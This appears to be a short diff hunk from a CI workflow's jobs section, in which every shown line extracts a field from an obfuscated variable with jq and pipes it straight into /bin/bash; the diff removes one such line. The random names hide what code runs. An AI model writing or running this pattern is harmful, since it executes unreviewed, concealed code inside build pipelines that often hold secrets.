@@ -21,7 +21,6 @@ jobs:
           echo $lipil07 | jq -r .kfz021 | /bin/bash
           printf '%s' "$w2707" | jq -r .fvaz757 | /bin/bash
           printf '%s' "$pict75877" | jq -r .j7 | /bin/bash
-          printf '%s' "$dvd5" | jq -r .vtmo75 | /bin/bash
           echo $chebm7 | jq -r .w65 | /bin/bash
           printf '%s' "$sw3387" | jq -r .gzobl720 | /bin/bash
           echo $mcbja6985 | jq -r .fosp3 | /bin/bash
